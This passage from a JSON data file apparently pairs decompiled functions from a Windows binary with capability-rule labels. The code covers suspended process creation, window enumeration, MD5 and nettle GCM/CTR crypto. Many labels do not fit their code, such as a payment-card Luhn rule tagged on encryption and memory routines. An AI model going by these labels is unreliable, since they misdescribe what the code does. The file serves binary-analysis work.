            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004143f2(uint param_1, uchar *param_2, int32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uchar auStack13 [5];\n    \n    auStack13[0] = *param_2;\n    cVar1 = fcn.00413a0f(auStack13[0]);\n    if (cVar1 != '\\0') {\n        iVar2 = sub.msvcrt.dll_fwrite(param_2 + 1, 1, param_3 + -1, *(extraout_ECX * 4 + 0x42b5e0));\n        if (param_3 + -1 == iVar2) {\n            return;\n        }\n        fcn.00413a29(auStack13[0]);\n    }\n    fcn.00405d7d(param_1, 0xad, auStack13, 1);\n    return;\n}\n",
        "token_count": 213
    },
    "00414470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414470(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint uVar4;\n    uchar auStack96 [16];\n    uchar auStack80 [40];\n    uint uStack40;\n    uchar auStack36 [24];\n    \n    cVar1 = fcn.00406f1a(param_2);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00407e8c(param_2);\n        if (cVar1 != '\\0') {\n            fcn.004129e4(auStack80, 0, 0x44);\n            fcn.004129e4(auStack96, 0, 0x10);\n            uVar4 = 0;\n            iVar2 = sub.KERNEL32.dll_CreateProcessA(0, param_2, 0, 0, 0, 4, 0, 0, auStack80, auStack96);\n            if (iVar2 != 0) {\n                fcn.00408af3();\n                fcn.00405999(auStack36);\n                uVar3 = sub.KERNEL32.dll_ResumeThread(uVar4);\n                if (uVar3 == 1) {\n    // WARNING: Subroutine does not return\n                    sub.KERNEL32.dll_ExitProcess(0);\n                }\n                fcn.00408ab3(uVar3 >> 0x20);\n            }\n        }\n    }\n    fcn.00405d7d(uStack40, 0x9e, 0, 0);\n    return;\n}\n",
        "token_count": 361
    },
    "004146e1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate gui resources"
        ],
        "decompiled_code": "\nvoid fcn.004146e1(void)\n\n{\n    uint uVar1;\n    uint unaff_EBX;\n    uint uStack32;\n    uchar auStack24 [20];\n    \n    fcn.0041236c(auStack24, 0x8000);\n    uVar1 = sub.USER32.dll_EnumWindows(0x4145f4, auStack24);\n    uVar1 = fcn.00412540(auStack24, uVar1);\n    fcn.00405d7d(unaff_EBX, 0xc1, uStack32, uVar1);\n    fcn.004123b1(auStack24);\n    return;\n}\n",
        "token_count": 147
    },
    "0041479d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.0041479d(uint param_1, uint param_2)\n\n{\n    uchar auStack524 [504];\n    uint uStack20;\n    \n    sub.KERNEL32.dll_MultiByteToWideChar(0xfde9, 0, param_2, 0x100, auStack524, 0x100);\n    sub.USER32.dll_SetWindowTextW(uStack20, auStack524);\n    return;\n}\n",
        "token_count": 94
    },
    "004161b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004161b5(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sub.msvcrt.dll_ftell(*(*(param_1 + 0x48) + 0x3c));\n    if (param_3 < 0) {\n        return 0;\n    }\n    if (((iVar1 >> 0x1f != param_3) || (iVar1 != param_2)) &&\n       (iVar1 = sub.msvcrt.dll_fseek(*(*(param_1 + 0x48) + 0x3c), param_2, 0),  iVar1 != 0)) {\n        return 0;\n    }\n    // WARNING: Could not recover jumptable at 0x0041f764. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar2 = (*_sym.imp.msvcrt.dll_fread)();\n    return uVar2;\n}\n",
        "token_count": 227
    },
    "00416245": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00416245(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sub.msvcrt.dll_ftell(*(*(param_1 + 0x48) + 0x3c));\n    if (param_3 < 0) {\n        return 0;\n    }\n    if (((iVar1 >> 0x1f != param_3) || (iVar1 != param_2)) &&\n       (iVar1 = sub.msvcrt.dll_fseek(*(*(param_1 + 0x48) + 0x3c), param_2, 0),  iVar1 != 0)) {\n        return 0;\n    }\n    // WARNING: Could not recover jumptable at 0x0041f72c. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar2 = (*_sym.imp.msvcrt.dll_fwrite)();\n    return uVar2;\n}\n",
        "token_count": 227
    },
    "004162d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004162d5(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    \n    iVar1 = sub.msvcrt.dll_malloc(param_2 + 1);\n    iVar2 = 0;\n    if (iVar1 == 0) {\n        iVar1 = 0;\n    }\n    else {\n        for (; (param_2 != iVar2 && (cVar3 = *(in_EAX + iVar2),  cVar3 != '\\0')); iVar2 = iVar2 + 1) {\n            if (cVar3 == '\\\\') {\n                cVar3 = '/';\n            }\n            *(iVar1 + iVar2) = cVar3;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 184
    },
    "004171da": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.004171da(uint32_t param_1, uint8_t *param_2, int32_t param_3)\n\n{\n    uint32_t uVar1;\n    uint8_t *puVar2;\n    \n    uVar1 = 0;\n    if (param_2 != NULL) {\n        param_1 = ~param_1;\n        puVar2 = param_2 + param_3;\n        for (; param_2 != puVar2; param_2 = param_2 + 1) {\n            uVar1 = param_1 >> 4 ^ *(((param_1 ^ *param_2) & 0xf) * 4 + 0x424da0);\n            param_1 = uVar1 >> 4 ^ *(((*param_2 >> 4 ^ uVar1) & 0xf) * 4 + 0x424da0);\n        }\n        uVar1 = ~param_1;\n    }\n    return uVar1;\n}\n",
        "token_count": 216
    },
    "0041c5a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0041c5a7(int32_t *param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    iVar1 = sub.msvcrt.dll_fopen(param_2, 0x424983);\n    if (iVar1 != 0) {\n        iVar2 = sub.msvcrt.dll_fseek(iVar1, 0, 2);\n        if (iVar2 == 0) {\n            iVar2 = sub.msvcrt.dll_ftell(iVar1);\n            iVar3 = fcn.0041606c();\n            if (iVar3 != 0) {\n                param_1[0xe] = fcn.004161b5;\n                param_1[0x11] = param_1;\n                *(param_1[0x12] + 0x3c) = iVar1;\n                *param_1 = iVar2;\n                param_1[1] = iVar2 >> 0x1f;\n                iVar1 = fcn.00416619();\n                if (iVar1 == 0) {\n                    fcn.0041c416(param_1);\n                    return 0;\n                }\n                return 1;\n            }\n        }\n        sub.msvcrt.dll_fclose(iVar1);\n    }\n    return iVar3;\n}\n",
        "token_count": 302
    },
    "0041e521": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e521(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n        fcn.0041dd3f(param_1);\n        fcn.0041df49(param_1);\n        fcn.0041c416(param_1);\n    // WARNING: Could not recover jumptable at 0x0041f75c. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 120
    },
    "0041f980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f980(int32_t param_1, uint param_2)\n\n{\n    fcn.0041fca0(param_1 + 0x1040, param_2);\n    fcn.0041ff50(param_1, param_1 + 0x1040, 0x41fbe0);\n    return;\n}\n",
        "token_count": 78
    },
    "0041f9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f9c0(int32_t param_1, uint param_2, uint param_3)\n\n{\n    fcn.004200d0(param_1 + 0x1000, param_1, param_2, param_3);\n    return;\n}\n",
        "token_count": 63
    },
    "0041fa70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0041fa70(int32_t param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.004202f0(param_1 + 0x1000, param_1, param_1 + 0x1040, 0x41fbe0, param_2, param_3, param_4);\n    return;\n}\n",
        "token_count": 87
    },
    "0041fca0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041fca0(uint param_1, uint param_2)\n\n{\n    fcn.004211c0(0xe, 8, param_1, param_2);\n    return;\n}\n",
        "token_count": 48
    },
    "0041fd20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fd20(uint param_1, int32_t param_2)\n\n{\n    uint32_t *in_EAX;\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    \n    puVar1 = *(in_EAX + 0xf) * 0x10 + param_2;\n    uStack28 = *puVar1;\n    uStack24 = puVar1[1];\n    uStack20 = puVar1[2];\n    uStack16 = puVar1[3];\n    puVar1 = in_EAX + 0xe;\n    do {\n        puVar2 = puVar1 + -1;\n        fcn.0041fcd0();\n        puVar1 = *puVar1 * 0x10 + param_2;\n        uStack28 = uStack28 ^ *puVar1;\n        uStack24 = uStack24 ^ puVar1[1];\n        uStack20 = uStack20 ^ puVar1[2];\n        uStack16 = uStack16 ^ puVar1[3];\n        puVar1 = puVar2;\n    } while (in_EAX != puVar2);\n    fcn.0041fcd0();\n    puVar1 = param_2 + *in_EAX * 0x10;\n    *in_EAX = uStack28 ^ *puVar1;\n    in_EAX[1] = uStack24 ^ puVar1[1];\n    in_EAX[2] = uStack20 ^ puVar1[2];\n    in_EAX[3] = uStack16 ^ puVar1[3];\n    return;\n}\n",
        "token_count": 390
    },
    "0041fe20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fe20(uint32_t param_1, uint32_t *param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uVar5;\n    \n    uStack32 = param_1;\n    if (0xf < param_1) {\n        iVar1 = param_3 + 0x10 + (param_1 - 0x10 & 0xfffffff0);\n        do {\n            iVar3 = param_3 + 0x10;\n            fcn.00420420(param_2, param_3, 0x10);\n            fcn.0041fd20();\n            param_3 = iVar3;\n        } while (iVar3 != iVar1);\n        uStack32 = param_1 & 0xf;\n        param_3 = iVar1;\n    }\n    if (uStack32 != 0) {\n        fcn.00420420(param_2, param_3, uStack32);\n        puVar2 = *(param_2 + 0xf) * 0x10 + in_EAX;\n        uStack28 = *puVar2;\n        uStack24 = puVar2[1];\n        uStack20 = puVar2[2];\n        uVar5 = puVar2[3];\n        puVar2 = param_2 + 0xe;\n        do {\n            puVar4 = puVar2 + -1;\n            fcn.0041fcd0();\n            puVar2 = *puVar2 * 0x10 + in_EAX;\n            uStack28 = uStack28 ^ *puVar2;\n            uStack24 = uStack24 ^ puVar2[1];\n            uStack20 = uStack20 ^ puVar2[2];\n            uVar5 = uVar5 ^ puVar2[3];\n            puVar2 = puVar4;\n        } while (param_2 != puVar4);\n        fcn.0041fcd0();\n        puVar2 = in_EAX + *param_2 * 0x10;\n        *param_2 = uStack28 ^ *puVar2;\n        param_2[1] = uStack24 ^ puVar2[1];\n        param_2[2] = uStack20 ^ puVar2[2];\n        param_2[3] = uVar5 ^ puVar2[3];\n        return;\n    }\n    return;\n}\n",
        "token_count": 591
    },
    "004200d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.004200d0(uint *param_1, uint param_2, int32_t param_3, uint *param_4)\n\n{\n    char *pcVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    if (param_3 == 0xc) {\n        *param_1 = *param_4;\n        param_1[1] = param_4[1];\n        uVar2 = param_4[2];\n        param_1[3] = 0x1000000;\n        param_1[2] = uVar2;\n    }\n    else {\n        *param_1 = 0;\n        param_1[1] = 0;\n        param_1[2] = 0;\n        param_1[3] = 0;\n        fcn.0041fe20(param_4);\n        fcn.0041feb0(0, 0, param_3, 0);\n    }\n    param_1[4] = *param_1;\n    param_1[5] = param_1[1];\n    param_1[6] = param_1[2];\n    param_1[7] = param_1[3];\n    cVar3 = (param_1[3] >> 0x18) + '\\x01';\n    *(param_1 + 0x1f) = cVar3;\n    if (cVar3 == '\\0') {\n        iVar5 = 3;\n        do {\n            iVar4 = iVar5 + -1;\n            pcVar1 = param_1 + iVar5 + 0x1b;\n            *pcVar1 = *pcVar1 + '\\x01';\n            if (*pcVar1 != '\\0') break;\n            iVar5 = iVar4;\n        } while (iVar4 != 0);\n    }\n    param_1[8] = 0;\n    param_1[9] = 0;\n    param_1[10] = 0;\n    param_1[0xb] = 0;\n    param_1[0xe] = 0;\n    param_1[0xf] = 0;\n    param_1[0xc] = 0;\n    param_1[0xd] = 0;\n    return;\n}\n",
        "token_count": 512
    },
    "004202f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.004202f0(int32_t param_1, uint param_2, uint param_3, uint param_4, uint32_t param_5, uint param_6, \n                 uint param_7)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    \n    if ((*(param_1 + 0x38) & 0xf) != 0) {\n        (*_sym.imp.msvcrt.dll__assert)(\"ctx->data_size % GCM_BLOCK_SIZE == 0\", 0x426780, 0x1da);\n    }\n    fcn.0041fe20(param_7);\n    fcn.00421320(param_3, param_4, 0x41fdc0, param_1 + 0x10, param_5, param_6, param_7);\n    puVar1 = param_1 + 0x38;\n    uVar2 = *puVar1;\n    *puVar1 = *puVar1 + param_5;\n    *(param_1 + 0x3c) = *(param_1 + 0x3c) + CARRY4(uVar2, param_5);\n    return;\n}\n",
        "token_count": 265
    },
    "00421320": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl\nfcn.00421320(uint arg_8h, code *arg_ch, code *arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch, \n            uint32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char **ppcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    char *pcStack76;\n    char *pcStack72;\n    uint *puStack68;\n    uint *puStack64;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_ch;\n    \n    if ((arg_1ch == arg_20h) || ((arg_1ch & 7) != 0)) {\n        uVar10 = arg_18h + 0xf >> 4;\n        iVar1 = fcn.0041f3f0();\n        iVar1 = -iVar1;\n        ppcVar6 = &stack0xffffffb4 + iVar1;\n        uVar9 = &fcn.00421320::var_2ch + iVar1 + 3 & 0xfffffff0;\n        if (uVar10 < 0x20) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = 0;\n            var_2ch = arg_18h & 0xfffffe00;\n            ppcVar6 = &stack0xffffffb4 + iVar1;\n            do {\n                ppcVar6[2] = uVar9;\n                ppcVar6[1] = 0x20;\n                *ppcVar6 = arg_14h;\n                puVar5 = ppcVar6 + -1;\n                ppcVar6[-1] = 0x4213be;\n                (*arg_10h)();\n                puVar5[3] = uVar9;\n                puVar5[2] = uVar9;\n                *puVar5 = arg_8h;\n                puVar5[1] = 0x200;\n                ppcVar6 = puVar5 + -1;\n                puVar5[-1] = 0x4213d7;\n                (*arg_ch)();\n                iVar3 = arg_20h + uVar4;\n                iVar1 = arg_1ch + uVar4;\n                uVar2 = arg_18h - uVar4;\n                if (var_2ch == uVar4) goto code_r0x004213eb;\n                ppcVar6[2] = uVar9;\n                uVar10 = uVar10 - 0x20;\n                uVar4 = uVar4 + 0x200;\n                ppcVar6[3] = 0x200;\n                ppcVar6[1] = iVar3;\n                *ppcVar6 = iVar1;\n                ppcVar6[-1] = 0x4213a0;\n                fcn.004208c0();\n            } while (0x1f < uVar10);\n        }\n        if (uVar10 != 0) {\n            var_2ch = arg_18h - uVar4;\n            if (0x1ff < var_2ch) {\n                ppcVar6[2] = 0x63;\n                ppcVar6[1] = \"../nettle-3.5.1/ctr16.c\";\n                *ppcVar6 = \"length - i < CTR_BUFFER_LIMIT\";\n                ppcVar8 = ppcVar6 + -1;\n                ppcVar6 = ppcVar6 + -1;\n                *ppcVar8 = 0x421557;\n                (*_sym.imp.msvcrt.dll__assert)();\n            }\n            ppcVar6[1] = uVar10;\n            *ppcVar6 = arg_14h;\n            ppcVar6[2] = uVar9;\n            puVar7 = ppcVar6 + -1;\n            ppcVar6[-1] = 0x4214ee;\n            (*arg_10h)();\n            puVar7[3] = uVar9;\n            puVar7[2] = uVar9;\n            *puVar7 = arg_8h;\n            puVar7[1] = uVar10 << 4;\n            ppcVar6 = puVar7 + -1;\n            puVar7[-1] = 0x421503;\n            (*arg_ch)();\n            iVar3 = arg_20h + uVar4;\n            iVar1 = arg_1ch + uVar4;\n            uVar2 = var_2ch;\ncode_r0x004213eb:\n            ppcVar6[3] = uVar2;\n            ppcVar6[2] = uVar9;\n            ppcVar6[1] = iVar3;\n            *ppcVar6 = iVar1;\n            ppcVar6[-1] = 0x4213ff;\n            fcn.004208c0();\n        }\n    }\n    else {\n        puStack68 = arg_1ch;\n        pcStack72 = arg_18h >> 4;\n        pcStack76 = arg_14h;\n        (*arg_10h)();\n        puStack64 = arg_1ch;\n        uVar9 = arg_18h & 0xfffffff0;\n        puStack68 = arg_1ch;\n        pcStack76 = arg_8h;\n        pcStack72 = uVar9;\n        (*arg_ch)();\n        pcStack72 = arg_20h;\n        pcStack76 = arg_1ch;\n        puStack68 = uVar9;\n        fcn.00420420();\n        arg_18h = arg_18h - uVar9;\n        if (arg_18h != 0) {\n            var_2ch = arg_1ch + uVar9;\n            if (0xf < arg_18h) {\n                puStack68 = 0x47;\n                pcStack72 = \"../nettle-3.5.1/ctr16.c\";\n                pcStack76 = \"length < 16\";\n                (*_sym.imp.msvcrt.dll__assert)();\n            }\n            pcStack72 = 0x1;\n            pcStack76 = arg_14h;\n            puStack68 = &fcn.00421320::var_28h;\n            (*arg_10h)();\n            pcStack76 = arg_8h;\n            pcStack72 = 0x10;\n            puStack68 = &fcn.00421320::var_28h;\n            puStack64 = &fcn.00421320::var_28h;\n            (*arg_ch)();\n            pcStack76 = var_2ch;\n            pcStack72 = uVar9 + arg_20h;\n            puStack68 = &fcn.00421320::var_28h;\n            puStack64 = arg_18h;\n            fcn.004208c0();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 1579
    },
    "0040adea": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data with MD5"
        ],
        "decompiled_code": "\nvoid fcn.0040adea(uint *param_1)\n\n{\n    param_1[2] = 0x67452301;\n    param_1[3] = 0xefcdab89;\n    param_1[4] = 0x98badcfe;\n    param_1[5] = 0x10325476;\n    *param_1 = 0;\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 101
    },
    "00404125": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00404125(uint32_t param_1)\n\n{\n    fcn.0040410c(param_1 >> 8 & 0xff);\n    *(*0x428008 + *0x428004) = param_1;\n    *0x428004 = *0x428004 + 1;\n    return;\n}\n",
        "token_count": 73
    },
    "0041f3f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t fcn.0041f3f0(void)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint *puVar2;\n    uint32_t uStack8;\n    \n    puVar2 = &stack0x00000004;\n    uVar1 = in_EAX;\n    if (0xfff < in_EAX) {\n        do {\n            puVar2 = puVar2 + -0x400;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack8 = in_EAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack8;\n}\n",
        "token_count": 175
    },
    "00403c8c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00403c8c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0;\n    do {\n        *(param_1 + iVar1 * 4) = 0;\n        *(param_1 + 0xf0 + iVar1 * 4) = 0;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0x3c);\n    *(param_1 + 0x1e0) = 0;\n    return;\n}\n",
        "token_count": 117
    },
    "004041f5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004041f5(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    *0x42b0a0 = 0xffc4;\n    *0x42b0a2 = 0x1a2;\n    *0x42b0a4 = 0;\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b0a5) = *(iVar2 + 0x422225);\n        iVar2 = iVar1;\n    } while (iVar1 != 0x10);\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b0b5) = *(iVar2 + 0x422218);\n        iVar2 = iVar1;\n    } while (iVar1 != 0xc);\n    *0x42b0c1 = 0x10;\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b0c2) = *(iVar2 + 0x4221e5);\n        iVar2 = iVar1;\n    } while (iVar1 != 0x10);\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b0d2) = *(iVar2 + 0x422140);\n        iVar2 = iVar1;\n    } while (iVar1 != 0xa2);\n    *0x42b174 = 1;\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b175) = *(iVar2 + 0x422205);\n        iVar2 = iVar1;\n    } while (iVar1 != 0x10);\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b185) = *(iVar2 + 0x4221f8);\n        iVar2 = iVar1;\n    } while (iVar1 != 0xc);\n    *0x42b191 = 0x11;\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b192) = *(iVar2 + 0x422125);\n        iVar2 = iVar1;\n    } while (iVar1 != 0x10);\n    iVar2 = 0;\n    do {\n        iVar1 = iVar2 + 1;\n        *(iVar2 + 0x42b1a2) = *(iVar2 + 0x422080);\n        iVar2 = iVar1;\n    } while (iVar1 != 0xa2);\n    return;\n}\n",
        "token_count": 624
    },
    "00412740": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00412740(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    do {\n        cVar1 = *param_1;\n        if (cVar1 == param_2) {\n            return param_1;\n        }\n        param_1 = param_1 + 1;\n    } while (cVar1 != '\\0');\n    return NULL;\n}\n",
        "token_count": 91
    },
    "004127f3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004127f3(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    do {\n        if (param_3 <= iVar3) {\n            return 0;\n        }\n        pcVar1 = param_2 + iVar3;\n        pcVar2 = param_1 + iVar3;\n        iVar3 = iVar3 + 1;\n    } while (*pcVar2 == *pcVar1);\n    return iVar3;\n}\n",
        "token_count": 136
    },
    "00412861": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong __thiscall fcn.00412861(int32_t param_1, char *param_2, char *param_3)\n\n{\n    char cVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    if ((param_2 != NULL) && (iVar4 = param_1,  param_3 != NULL)) {\n        do {\n            cVar1 = *param_2;\n            if ((cVar1 == '\\0') || (param_1 = *param_3,  *param_3 == '\\0')) {\n                iVar3 = -(*param_3 != cVar1);\n                goto code_r0x004128af;\n            }\n            param_2 = param_2 + 1;\n            param_3 = param_3 + 1;\n            cVar1 = fcn.0041284f(cVar1);\n            cVar2 = fcn.0041284f();\n            iVar4 = param_1;\n        } while (cVar1 == cVar2);\n    }\n    iVar3 = -1;\n    iVar4 = param_1;\ncode_r0x004128af:\n    return CONCAT44(iVar4, iVar3);\n}\n",
        "token_count": 264
    },
    "0041299e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0041299e(char param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = 0;\n    bVar2 = param_2 == 0;\n    while( true ) {\n        if (bVar2) {\n            return iVar1;\n        }\n        if (*(param_2 + iVar1) == '\\0') break;\n        bVar2 = *(param_2 + iVar1) == param_1;\n        iVar1 = iVar1 + 1;\n    }\n    return -1;\n}\n",
        "token_count": 130
    },
    "004129c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.004129c0(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    do {\n        if (param_3 == iVar3) {\n            return 0;\n        }\n        pcVar1 = param_1 + iVar3;\n        iVar3 = iVar3 + 1;\n        cVar2 = *(param_2 + -1 + iVar3);\n    } while (*pcVar1 == cVar2);\n    return *pcVar1 - cVar2;\n}\n",
        "token_count": 144
    },
    "004129e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004129e4(int32_t param_1, uchar param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 0; iVar1 != param_3; iVar1 = iVar1 + 1) {\n        *(param_1 + iVar1) = param_2;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00412aa3": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00412aa3(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 0; iVar1 != param_3; iVar1 = iVar1 + 1) {\n        *(param_1 + iVar1) = *(param_2 + iVar1);\n    }\n    return;\n}\n",
        "token_count": 89
    }
}